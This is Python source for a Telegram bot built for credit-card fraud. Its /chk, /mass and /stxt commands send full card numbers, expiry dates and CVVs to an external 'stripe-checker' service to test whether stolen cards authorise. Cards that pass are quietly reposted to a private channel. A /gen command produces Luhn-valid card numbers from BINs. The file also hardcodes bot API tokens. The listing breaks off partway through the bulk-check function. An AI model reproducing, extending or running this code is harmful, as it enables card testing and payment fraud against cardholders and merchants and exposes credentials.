import telebot
import time
import os
from datetime import datetime
from reg import reg
import threading
from bs4 import BeautifulSoup
import json
import os
import asyncio

#======== Api Import @OnlyXFanbot ==≠==

#8061815204:AAE5tG35y-Ztsyq1aXHFByqTjs4OoXMHsUY
API_TOKEN = "7567332983:AAFBAqaid4NkBKxqUl4Kg529IYDXMYgU3MA"

bot = telebot.TeleBot(API_TOKEN)





# 🔰 /start command for all users
@bot.message_handler(commands=['start'])
def send_start(message):
    msg = '''<b>🤖 Bot Status: Active ✅
Bot command Free for all limited Time soon adding more gateway

Stripe auth 0.01$
/chk  -  single
/mass - mass 7 limited
/stxt - Txt support 1K


Tools
/gen  - Generate
/bin  - bin lookhub 
/ping -  bot checking ping 
/id - account info

</b>'''
    bot.reply_to(message, msg, parse_mode='HTML')




    


# --- /ping command ---
@bot.message_handler(commands=['ping'])
def ping_command(message):
    start = time.time()
    sent = bot.reply_to(message, "🏓 Pinging...")
    end = time.time()
    latency = (end - start) * 1000
    bot.edit_message_text(chat_id=sent.chat.id,
                          message_id=sent.message_id,
                          text=f"🏓 Pong!\nLatency: <b>{int(latency)} ms</b>",
                          parse_mode='HTML')
                          
                          
                          


# --- /id command ---
@bot.message_handler(commands=['id'])
def id_command(message):
    user = message.from_user
    user_id = user.id
    plan = "FREE"

    id_info = f"""<b>ℹ️ User Info</b>

ID: <code>{user.id}</code>
Name: {user.first_name}
Username: @{user.username if user.username else "N/A"}
Plan: <b>{plan}</b>
"""
    
    bot.reply_to(message, id_info, parse_mode='HTML')

import telebot
import re
import os


# Handler for both /fl and .fl commands
@bot.message_handler(commands=['fl'])  # Handles /fl
@bot.message_handler(regexp=r'^\.fl')  # Handles .fl
def filter_cards(message):
    try:
        # Get the message text or replied message text
        if message.reply_to_message and message.reply_to_message.text:
            input_text = message.reply_to_message.text
        else:
            # Remove command prefix (/fl or .fl) from the text
            input_text = message.text[3:] if message.text.startswith('/fl') else message.text[3:]

        # Handle file attachments if present
        if message.reply_to_message and message.reply_to_message.document:
            file_info = bot.get_file(message.reply_to_message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            input_text = downloaded_file.decode('utf-8')

        # Process the input text
        if input_text:
            all_cards = input_text.split('\n')
        else:
            all_cards = []

        cards = ""
        for cc in all_cards:
            try:
                # Extract numbers using regex
                x = re.findall(r'\d+', cc)
                if len(x) >= 4:  # Ensure we have all required fields
                    ccn = x[0]    # Card number
                    mm = x[1]     # Month
                    yy = x[2]     # Year
                    cvv = x[3]    # CVV

                    # Fix common format issues
                    if mm.startswith('2'):  # If month starts with 2, swap with year
                        mm, yy = yy, mm
                    if len(mm) >= 3:       # If month is too long, rearrange
                        mm, yy, cvv = yy, cvv, mm

                    # Validate card number length
                    if 15 <= len(ccn) <= 16:
                        cards += f"{ccn}|{mm}|{yy}|{cvv}\n"
            except:
                continue

        # Send response based on results
        if cards:
            card_count = len(cards.split('\n')) - 1  # Subtract 1 for empty last line
            if card_count >= 32:
                # Save to file and send as document
                filename = 'Filtered_Cards.txt'
                with open(filename, 'w') as file:
                    file.write(cards)
                with open(filename, 'rb') as file:
                    bot.reply_to(message, f"Filtered {card_count} cards", parse_mode='HTML')
                    bot.send_document(message.chat.id, file, reply_to_message_id=message.message_id)
                os.remove(filename)
            else:
                # Send as text message
                bot.reply_to(
                    message,
                    f"<code>{cards}</code>",
                    parse_mode='HTML'
                )
        else:
            bot.reply_to(
                message,
                "<b>Filter Failed ⚠️\n\nNo Valid Cards Found in the Input.</b>",
                parse_mode='HTML'
            )

    except Exception as e:
        bot.reply_to(
            message,
            f"Error occurred: {str(e)}"
        )



import telebot
import re
import random
import time
import os
import csv
import pycountry
import requests

# Replace with your bot token

CSV_FILE = 'bins_all.csv'

# Bank name fixes (if you have a dictionary for this)
BANK_NAME_FIXES = {}  # Add your bank name fixes here if needed

def expand_bank_name(bank_name):
    words = bank_name.split()
    expanded_words = [BANK_NAME_FIXES.get(word, word) for word in words]
    return " ".join(expanded_words)

def get_bin_info_from_csv(fbin):
    if not os.path.exists(CSV_FILE):
        return None  # CSV file not found
    
    try:
        with open(CSV_FILE, mode='r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                if row[0] == fbin:
                    return {
                        "bin": row[0],
                        "country": row[1],
                        "flag": row[2],
                        "brand": row[3],
                        "type": row[4],
                        "level": row[5],
                        "bank": expand_bank_name(row[6])  # Expand issuer name
                    }
    except Exception as e:
        print(f"Error reading CSV: {e}")
        return None
    return None  # BIN not found

def get_country_name(code, fallback_country_name):
    try:
        country = pycountry.countries.get(alpha_2=code)
        return country.name if country else fallback_country_name
    except Exception as e:
        print(f"Error getting country name: {e}")
        return fallback_country_name

def luhn_algorithm(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return card_number if checksum % 10 == 0 else None

def generate_valid_card(bin_input):
    card_length = 16  # Default for Visa/Mastercard
    if bin_input.startswith("34") or bin_input.startswith("37"):  # AMEX
        card_length = 15

    card_number = bin_input + ''.join(str(random.randint(0, 9)) for _ in range(card_length - len(bin_input)))
    valid_card = luhn_algorithm(card_number)
    
    if valid_card:
        return valid_card
    else:
        return generate_valid_card(bin_input)  # Retry if invalid

@bot.message_handler(func=lambda message: message.text.lower().startswith('/gen') or message.text.lower().startswith('.gen'))
def handle_gen(message):
    user_id = str(message.from_user.id)
    
    gen_input = message.text.split()[1:]  # Get input after command

    if not gen_input:
        bot.reply_to(message, "<b>❌ Wrong Format</b>\n\n<b>Usage:</b>\nOnly Bin:\n<code>/gen 447697</code>\n\nWith Expiration:\n<code>/gen 447697|12</code>\n<code>/gen 447697|12|23</code>\n\nWith CVV:\n<code>/gen 447697|12|23|000</code>\n\nWith Custom Amount:\n<code>/gen 447697|12|23|000 100</code>", parse_mode="HTML")
        return

    gen_input = " ".join(gen_input)  # Merge input
    match = re.match(r'^(\d{6,19})(\|\d{2})?(\|\d{2})?(\|\d{3,4})?(?:\s+(\d+))?$', gen_input)

    if not match:
        bot.reply_to(message, "<b>❌ Wrong Format</b>\n\n<b>Usage:</b>\nOnly Bin:\n<code>/gen 447697</code>\n\nWith Expiration:\n<code>/gen 447697|12</code>\n<code>/gen 447697|12|23</code>\n\nWith CVV:\n<code>/gen 447697|12|23|000</code>\n\nWith Custom Amount:\n<code>/gen 447697|12|23|000 100</code>", parse_mode="HTML")
        return

    bin_input, month, year, cvv, amount = match.groups()
    month = month[1:] if month else None
    year = year[1:] if year else None
    cvv = cvv[1:] if cvv else None
    amount = int(amount) if amount else 10  # Default to 10 cards

    if amount > 10000:
        bot.reply_to(message, "<b>⚠️ Maximum limit is 10k</b>", parse_mode="HTML")
        return

    # Fetch BIN details from CSV
    bin_info = get_bin_info_from_csv(bin_input[:6])
    if bin_info is None:
        bot.reply_to(message, "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐁𝐈𝐍 ⚠️\n\n𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐍𝐨 𝐕𝐚𝐥𝐢𝐝 𝐁𝐈𝐍 𝐰𝐚𝐬 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐲�{o𝐮𝐫 𝐢𝐧𝐩𝐮𝐭.")
        return

    brand = bin_info.get("brand", "Unknown").upper()
    card_type = bin_info.get("type", "Unknown").upper()
    level = bin_info.get("level", "Unknown").upper()
    country = get_country_name(bin_info.get("country", "Unknown").upper(), "Unknown")
    country_flag = bin_info.get("flag", "🌐")
    bank = bin_info.get("bank", "Unknown").upper()

    # Send "Generating Cards..." and store the message object
    processing_msg = bot.reply_to(message, "🔄 Generating Cards...")

    start_time = time.perf_counter()
    cards = []

    for _ in range(amount):
        valid_card = generate_valid_card(bin_input)

        # Assign expiration date
        if month and year:
            expiration = f"{month.zfill(2)}|{year.zfill(2)}"
        elif month:
            expiration = f"{month.zfill(2)}|{random.randint(26, 30)}"
        elif year:
            expiration = f"{random.randint(1, 12):02}|{year.zfill(2)}"
        else:
            expiration = f"{random.randint(1, 12):02}|{random.randint(26, 30)}"

        # Assign CVV
        if bin_input.startswith("34") or bin_input.startswith("37"):
            cvv_code = str(random.randint(1000, 9999))  # 4-digit CVV for Amex
        else:
            cvv_code = cvv.zfill(3) if cvv else f"{random.randint(100, 999)}"

        card = f"{valid_card}|{expiration}|{cvv_code}"
        cards.append(f"<code>{card}</code>")

    elapsed_time = time.perf_counter() - start_time

    # Delete the "Generating Cards..." message
    bot.delete_message(chat_id=message.chat.id, message_id=processing_msg.message_id)

    if amount <= 10:
        response_msg = (
            f"- 𝐂𝐂 𝐆𝐞𝐧𝐚𝐫𝐚𝐭𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲\n"
            f"- 𝐁𝐢𝐧 - <code>{bin_input}</code>\n"
            f"- 𝐀𝐦𝐨𝐮𝐧𝐭 - {amount}\n\n"
            f"{chr(10).join(cards)}\n\n"
            f"- 𝗜𝗻𝗳𝗼 - {brand} - {card_type} - {level}\n"
            f"- 𝐁𝐚𝐧𝐤 - {bank} 🏛\n"
            f"- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 - {country} - {country_flag}\n\n"
        )
        bot.reply_to(message, response_msg, parse_mode="HTML")
    else:
        # Generate file for more than 10 cards
        filename = f"{bin_input}_generated_cards.txt"
        with open(filename, "w") as f:
            f.write("\n".join([card.replace("<code>", "").replace("</code>", "") for card in cards]))

        caption = (
            f"- 𝐁𝐢𝐧: <code>{bin_input}</code>\n"
            f"- 𝐀𝐦𝐨𝐮𝐧𝐭: {amount}\n\n"
            f"- 𝗜𝗻𝗳𝗼 - {brand} - {card_type} - {level}\n"
            f"- 𝐁𝐚𝐧𝐤 - {bank} 🏛\n"
            f"- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 - {country} - {country_flag}\n"
        )

        bot.send_document(message.chat.id, open(filename, 'rb'), caption=caption, parse_mode="HTML")
        os.remove(filename)  # Clean up file after sending
import telebot
import csv
import pycountry
import os
import threading
from queue import Queue
import tempfile



CSV_FILE = 'bins_all.csv'


def expand_bank_name(bank_name):
    words = bank_name.split()
    expanded_words = [BANK_NAME_FIXES.get(word.lower(), word) for word in words]
    return " ".join(expanded_words)

def get_bin_info_from_csv(fbin):
    if not os.path.exists(CSV_FILE):
        return None  # CSV file not found
    
    try:
        with open(CSV_FILE, mode='r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                if row[0] == fbin:
                    return {
                        "bin": row[0],
                        "country": row[1],
                        "flag": row[2],
                        "brand": row[3],
                        "type": row[4],
                        "level": row[5],
                        "bank": expand_bank_name(row[6])  # Expand issuer name
                    }
    except Exception as e:
        print(f"Error reading CSV: {e}")
        return None
    return None  # BIN not found

def get_country_name(code, fallback_country_name):
    try:
        country = pycountry.countries.get(alpha_2=code)
        return country.name if country else fallback_country_name
    except Exception as e:
        print(f"Error getting country name: {e}")
        return fallback_country_name

# Format for single BIN (with <code> tags)
def format_single_bin_response(bin_info, fbin):
    brand = bin_info.get("brand", "N/A").upper()
    card_type = bin_info.get("type", "N/A").upper()
    level = bin_info.get("level", "N/A").upper()
    bank = bin_info.get("bank", "N/A").upper()
    country_code = bin_info.get("country", "N/A").upper()
    flag = bin_info.get("flag", "🏳️")
    country_full_name = get_country_name(country_code, country_code)

    return f"""
𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 🔍

𝗕𝗜𝗡: <code>{fbin}</code>
𝗜𝗻𝗳𝗼: <code>{brand} - {card_type} - {level}</code>
𝗜𝘀𝘀𝘂𝗲𝗿: <code>{bank} 🏛</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <code>{country_full_name} {flag}</code>
"""

# Format for mass BIN (no <code> tags)
def format_mass_bin_response(bin_info, fbin):
    brand = bin_info.get("brand", "N/A").upper()
    card_type = bin_info.get("type", "N/A").upper()
    level = bin_info.get("level", "N/A").upper()
    bank = bin_info.get("bank", "N/A").upper()
    country_code = bin_info.get("country", "N/A").upper()
    flag = bin_info.get("flag", "🏳️")
    country_full_name = get_country_name(country_code, country_code)

    return f"""
𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 🔍

𝗕𝗜𝗡: {fbin}
𝗜𝗻𝗳𝗼: {brand} - {card_type} - {level}
𝗜𝘀𝘀𝘂𝗲𝗿: {bank} 🏛
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_full_name} {flag}
"""

# Single BIN lookup command
@bot.message_handler(commands=['bin', '.bin'])
def cmd_bin(message):
    user_id = str(message.from_user.id)
    
    try:
        parts = message.text.split()
        
        if len(parts) < 2:
            bot.reply_to(message, "♻️ Message: No BIN Found in your input ❌\n\nUsage: /bin [6 digit card no]")
            return
        
        fbin = parts[1][:6]
        checking_msg = bot.reply_to(message, "𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐁𝐈𝐍... 🔍", parse_mode="HTML")
        
        bin_info = get_bin_info_from_csv(fbin)
        
        if bin_info is None:
            bot.edit_message_text(
                "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐁𝐈𝐍 ⚠️\n\n𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐍𝐨 𝐕𝐚𝐥𝐢𝐝 𝐁𝐈𝐍 𝐰𝐚𝐬 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐲𝐨𝐮𝐫 𝐢𝐧𝐩𝐮𝐭.",
                chat_id=message.chat.id,
                message_id=checking_msg.message_id,
                parse_mode="HTML"
            )
            return

        response = format_single_bin_response(bin_info, fbin)  # Use single format with <code>
        bot.edit_message_text(
            response,
            chat_id=message.chat.id,
            message_id=checking_msg.message_id,
            parse_mode="HTML"
        )

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {e}")

# Multi-BIN lookup with threading and text file output
def process_bin_queue(queue, results, lock):
    while not queue.empty():
        fbin = queue.get()
        bin_info = get_bin_info_from_csv(fbin)
        with lock:
            if bin_info:
                results.append(format_mass_bin_response(bin_info, fbin))  # Use mass format without <code>
            else:
                results.append(f"𝐁𝐈𝐍: {fbin} - 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐨𝐫 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝 ⚠️")
        queue.task_done()

@bot.message_handler(commands=['mbkkin', '.mbkkin'])
def cmd_mbin(message):
    user_id = str(message.from_user.id)
    
    try:
        parts = message.text.split()
        
        if len(parts) < 2:
            bot.reply_to(message, "♻️ Message: No BINs Found in your input ❌\n\nUsage: /mbin [bin1 bin2 bin3 ...]")
            return
        
        bins = [part[:6] for part in parts[1:] if len(part) >= 6]
        if not bins:
            bot.reply_to(message, "♻️ Message: No Valid BINs Found in your input ❌")
            return
        
        # Limit to 300 BINs
        bins = bins[:40]
        checking_msg = bot.reply_to(message, f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 {len(bins)} 𝐁𝐈𝐍𝐬... 🔍", parse_mode="HTML")
        
        # Threading setup
        queue = Queue()
        results = []
        lock = threading.Lock()
        max_threads = min(2, len(bins))  # Limit threads to 300 or number of BINs
        
        for fbin in bins:
            queue.put(fbin)
        
        threads = []
        for _ in range(max_threads):
            t = threading.Thread(target=process_bin_queue, args=(queue, results, lock))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        # Write results to a temporary text file
        temp_file_path = tempfile.mktemp(suffix='.txt')
        with open(temp_file_path, 'w', encoding='utf-8') as temp_file:
            temp_file.write("𝗠𝘂𝗹𝘁𝗶-𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 𝗥𝗲𝘀𝘂𝗹𝘁 🔍\n\n")
            temp_file.write("\n\n".join(results))
        
        # Edit the checking message to indicate file is being sent
        bot.edit_message_text(
            f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞! 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐫𝐞𝐬𝐮𝐥𝐭𝐬 𝐟𝐨𝐫 {len(bins)} 𝐁𝐈𝐍𝐬... 📄",
            chat_id=message.chat.id,
            message_id=checking_msg.message_id,
            parse_mode="HTML"
        )
        
        # Send the text file with custom name
        with open(temp_file_path, 'rb') as file:
            bot.send_document(
                chat_id=message.chat.id,
                document=file,
                caption=f"Results for {len(bins)} BINs",
                reply_to_message_id=message.message_id,
                visible_file_name="Mass Bins details.txt"  # Custom file name for display
            )
        
        # Delete the "Checking complete" message
        bot.delete_message(
            chat_id=message.chat.id,
            message_id=checking_msg.message_id
        )
        
        # Clean up the temporary file
        os.unlink(temp_file_path)

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {e}")




from datetime import datetime
import threading
import json
import time
import requests
import telebot, types
import os
import csv
import pycountry
from collections import defaultdict, deque
import datetime as dt

command_usage = {}
BANK_NAME_FIXES = {}  
CSV_FILE = 'bins_all.csv'




# =========== BIN INFO ==============

def expand_bank_name(bank_name):
    words = bank_name.split()
    expanded_words = [BANK_NAME_FIXES.get(word, word) for word in words]
    return " ".join(expanded_words)

def get_bin_info_from_csv(fbin):
    if not os.path.exists(CSV_FILE):
        return None
    try:
        with open(CSV_FILE, mode='r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                if row[0] == fbin:
                    return {
                        "bin": row[0],
                        "country": row[1],
                        "flag": row[2],
                        "brand": row[3],
                        "type": row[4],
                        "level": row[5],
                        "bank": expand_bank_name(row[6])
                    }
    except Exception as e:
        print(f"Error reading CSV: {e}")
        return None
    return None

def get_country_name(code, fallback_country_name):
    try:
        country = pycountry.countries.get(alpha_2=code)
        return country.name if country else fallback_country_name
    except Exception as e:
        print(f"Error getting country name: {e}")
        return fallback_country_name




au_command_usage = {}  # To track rate limits

# --- Rate limit function ---
def check_au_rate_limit(user_id, cooldown):
    last_usage = au_command_usage.get(user_id)
    if last_usage:
        elapsed_time = (datetime.now() - last_usage).seconds
        if elapsed_time < cooldown:
            return cooldown - elapsed_time
    au_command_usage[user_id] = datetime.now()
    return 0

# --- .au / /au command handler ---
@bot.message_handler(func=lambda message: message.text.lower().startswith(('.chk', '/chk')))
def respond_to_au(message):
    user_id = message.from_user.id
    # --- Check user membership ---
    
    

    # --- Extract CC ---
    try:
        cc = message.reply_to_message.text if message.reply_to_message else message.text
        cc = str(reg(cc))
    except:
        cc = 'None'

    if cc == 'None':
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id,
            text='''<b>ɢᴀᴛᴇ ɴᴀᴍᴇ: sᴛʀɪᴘᴇ ᴀᴜᴛʜ ♻️

ᴍᴇssᴀɢᴇ: ɴᴏ ᴄᴄ ғᴏᴜɴᴅ ᴏʀ ɪɴᴄᴏʀʀᴇᴄᴛ ғᴏʀᴍᴀᴛ ❌

ᴜsᴀɢᴇ: /chk ᴄᴄ|ᴍᴇs|ᴀɴᴏ|ᴄᴠᴠ</b>''',
            parse_mode="HTML"
        )
        return

    # --- Cooldown check ---
    cooldown = 30
    remaining_time = check_au_rate_limit(user_id, cooldown)
    if remaining_time > 0:
        bot.reply_to(message, f"<b>Try again after {remaining_time} seconds.</b>", parse_mode="HTML")
        return

    processing_msg = bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id

    threading.Thread(target=process_au_command, args=(message, processing_msg, cc)).start()

# --- Main logic thread ---
def process_au_command(message, processing_msg_id, cc):
    gate = 'sᴛʀɪᴘᴇ ᴀᴜᴛʜ'
    start_time = time.time()

    try:
        url = f"https://stripe-checker-production.up.railway.app/v1/stripe/cc={cc}"
        response = requests.get(url, timeout=20)
        result = response.json()
        last = result.get("result", "Error")
        Gateway = result.get("gateway", "Unknown")
        card = result.get("card", "Error")
    except Exception:
        last = "Error"
        Gateway = "Unknown"
        price = "Error"

    bin_info = get_bin_info_from_csv(cc[:6])
    if bin_info:
        brand = bin_info.get('brand', 'Unknown')
        card_type = bin_info.get('type', 'Unknown')
        country = get_country_name(bin_info.get('country', 'Unknown'), 'Unknown')
        country_flag = bin_info.get('flag', '🏳️')
        bank = bin_info.get('bank', 'Unknown')
        level = bin_info.get('level', 'Unknown')
    else:
        brand = card_type = country = country_flag = bank = level = 'Unknown'

    execution_time = time.time() - start_time

    msg = f'''<b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝗖𝗮𝗿𝗱: <code>{cc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {last}

𝗜𝗻𝗳𝗼: <code>{cc[:6]} - {card_type} - {brand} - {level}</code>
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝗧𝗶𝗺𝗲: {execution_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
</b>'''

    msgd = f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌

𝗖𝗮𝗿𝗱: <code>{cc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate}
𝐑𝐞𝐬𝐩𝗼𝗻𝘀𝗲: {last}

𝗜𝗻𝗳𝗼: <code>{cc[:6]} - {card_type} - {brand} - {level}</code>
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝗧𝗶𝗺𝗲: {execution_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
</b>'''

    if any(x in last.lower() for x in ['funds', 'invalid postal', 'avs', 'added', 'duplicate', 'approved', 'allowed', 'purchase']):
        bot.edit_message_text(chat_id=message.chat.id, message_id=processing_msg_id, text=msg, parse_mode="HTML")
        # ✅ Post approved card to channel silently
        try:
            bot.send_message(id_channel, msg, parse_mode="HTML")
        except:
            pass  # Ignore any posting errors completely
    else:
        
        bot.edit_message_text(chat_id=message.chat.id, message_id=processing_msg_id, text=msgd, parse_mode="HTML")





        
from datetime import datetime
import threading
import time
import requests
import json
import os
from collections import defaultdict, deque
import datetime as dt


# ============ Rate Limit Tracking ============
mass_last_used = {}


# ============ Validate CC ============
def validate_cc(cc_line):
    try:
        cc_valid = reg(cc_line)
        return cc_valid if cc_valid != "None" else None
    except:
        return None


# ============ BIN Info ============
def get_card_info(cc):
    try:
        data = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}").json()
        brand = data.get("brand", "Unknown")
        card_type = data.get("type", "Unknown")
        country = data.get("country_name", "Unknown")
        country_flag = data.get("country_flag", "🏳️")
        bank = data.get("bank", "Unknown")
    except:
        brand = card_type = country = country_flag = bank = "Unknown"
    return brand, card_type, country, country_flag, bank


# ===============================
#    . M A S S    C O M M A N D
# ===============================
def process_card_mass(cc):
    brand, card_type, country, flag, bank = get_card_info(cc)
    try:
        url = f"https://stripe-checker-production.up.railway.app/v1/stripe/cc={cc}"
        response = requests.get(url, timeout=20)
        final = response.json()
        result = final.get("result", "Error")
        Gateway = final.get("gateway", "Unknown")
        card = final.get("card", "Error")
    except Exception:
        result = "Error"
        Gateway = "Unknown"
        price = "Error"        

    status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if any(i in result.lower() for i in ["approved", "funds", "added", "purchase", "duplicate", " avs"]) else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    return f"Card↯ <code>{cc}</code>\nStatus - {status}\nResult -⤿ {result} ⤾\n"


def process_mass_command(message, processing_msg):
    user_id = message.from_user.id
    text = message.reply_to_message.text if message.reply_to_message else message.text[5:]
    cards = [validate_cc(i.strip()) for i in text.strip().split('\n') if i.strip()]
    cards = [c for c in cards if c][:12]

    if not cards:
        bot.edit_message_text(
            "ɢᴀᴛᴇ ɴᴀᴍᴇ: Mass stripe ᴀᴜᴛʜ ♻️\n\n"
            "ᴍᴇssᴀɢᴇ: ɴᴏ ᴄᴄ ғᴏᴜɴᴅ ᴏʀ ɪɴᴄᴏʀʀᴇᴄᴛ ғᴏʀᴍᴀᴛ ❌\n\n"
            "ᴜsᴀɢᴇ: /mass ᴄᴄ|ᴍᴇs|ᴀɴᴏ|ᴄᴠᴠ",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        return  # no rate limit applied here

    current_time = time.time()
    if user_id in mass_last_used and (current_time - mass_last_used[user_id]) < 75:
        wait = int(75 - (current_time - mass_last_used[user_id]))
        bot.edit_message_text(f"⏳ Please wait {wait}s before using .mass again.", chat_id=message.chat.id, message_id=processing_msg.message_id)
        return

    mass_last_used[user_id] = current_time

    result = ["↯ Stripe ᴀᴜᴛʜ ♻️\n"]
    start = time.time()
    id_channel = -1003059260994  # your channel ID

    for cc in cards:
        msg = process_card_mass(cc)
        last = msg.lower()
        result.append(msg)

        # ✅ Auto-post approved cards to channel silently
        if any(x in last for x in ['funds', 'invalid postal', 'avs', 'added', 'duplicate', 'approved', 'allowed', 'purchase']):
            try:
                bot.send_message(id_channel, msg, parse_mode="HTML")
            except:
                pass  # Ignore any posting errors completely

    elapsed = time.time() - start
    result.append(f"- 𝗧𝗶𝗺𝗲 - {elapsed:.2f}s")

    bot.edit_message_text("\n".join(result), chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode="HTML")


@bot.message_handler(func=lambda m: m.text.lower().startswith(('.mass', '/mass')))
def respond_to_mass(message):
    user_id = message.from_user.id
    # --- Check user membership ---
    
    msg = bot.reply_to(message, "- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  Stripe ᴀᴜᴛʜ ♻️\n- 𝐒𝐭𝐚𝐭𝐮𝐬 - Processing...⌛️", parse_mode="HTML")
    threading.Thread(target=process_mass_command, args=(message, msg)).start()





from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import csv, re, time, threading, asyncio, os, json, random
from datetime import datetime, timedelta


# --- Load BIN Info from CSV ---
CSV_FILE = 'bins_all.csv'

def expand_bank_name(bank_name):
    words = bank_name.split()
    expanded_words = [BANK_NAME_FIXES.get(word, word) for word in words]  # Assuming BANK_NAME_FIXES is defined
    return " ".join(expanded_words)

def get_bin_info_from_csv(fbin):
    if not os.path.exists(CSV_FILE):
        return None
    
    try:
        with open(CSV_FILE, mode='r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                if row[0] == fbin:
                    return {
                        "bin": row[0],
                        "country": row[1],
                        "flag": row[2],
                        "brand": row[3],
                        "type": row[4],
                        "level": row[5],
                        "bank": expand_bank_name(row[6])
                    }
    except Exception as e:
        print(f"Error reading CSV: {e}")
        return None
    return None

def is_valid_cc_format(line):
    pattern = r'^\d{15,16}\|\d{2}\|\d{2,4}\|\d{3}$'
    return bool(re.match(pattern, line.strip()))



# ========== /stxt Fully Independent ==========
active_checks_stxt = {}
stopuser_stxt = {}


# --- /stxt Command Handler ---
@bot.message_handler(commands=['stxt'])
@bot.message_handler(regexp=r'^\.stxt')
def stxt_cmd(message):
    user_id = message.from_user.id
    
    if not (message.reply_to_message and message.reply_to_message.document):
        bot.reply_to(message,
            "ɢᴀᴛᴇ ɴᴀᴍᴇ: sᴛʀɪᴘᴇ ᴀᴜᴛʜ ♻️\n\n"
            "ᴍᴇssᴀɢᴇ: ɴᴏ ᴄᴄ ғᴏᴜɴᴅ ᴏʀ ɪɴᴄᴏʀʀᴇᴄᴛ ғᴏʀᴍᴀᴛ ❌\n\n"
            "ᴜsᴀɢᴇ: /stxt [ reply to fileLimited 1K ]"
        )
        return

    handle_stxt_command(message)


def handle_stxt_command(message):
    user_id = str(message.from_user.id)
    

    if active_checks_stxt.get(user_id, 0) >= 2:
        bot.reply_to(message, "⚠️ You already have 2 active /stxt checks running.")
        return

    try:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        input_text = downloaded_file.decode('utf-8', errors='ignore')

        cards = []
        for cc in input_text.split('\n'):
            try:
                x = re.findall(r'\d+', cc)
                if len(x) >= 4:
                    ccn, mm, yy, cvv = x[0], x[1], x[2], x[3]
                    if mm.startswith('2'): mm, yy = yy, mm
                    if len(mm) >= 3: mm, yy, cvv = yy, cvv, mm
                    if len(yy) == 4: yy = yy[-2:]
                    formatted = f"{ccn}|{mm}|{yy}|{cvv}"
                    if is_valid_cc_format(formatted):
                        cards.append(formatted)
            except:
                continue

        cards = cards[:1000]

        if not cards:
            bot.reply_to(message, "⚠️ Unable to read the file.")
            return

        active_checks_stxt[user_id] = active_checks_stxt.get(user_id, 0) + 1

        msg = bot.reply_to(message, f"𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 {len(cards)}  𝘾𝙖𝙧𝙙𝙨...⌛", parse_mode="HTML")

        stop_key = f"{user_id}_{msg.message_id}"
        stopuser_stxt[stop_key] = {'status': 'start'}

        threading.Thread(target=process_cards_stxt, args=(message, msg.message_id, cards, user_id)).start()

    except Exception:
        bot.reply_to(message, "⚠️ Unable to read the file.")


def process_cards_stxt(message, message_id, cards, user_id):
    approved, declined, otp_cards = 0, 0, 0
    total = len(cards)
    checked_cards = set()
    start_all = time.time()

    try:
        for cc in cards:
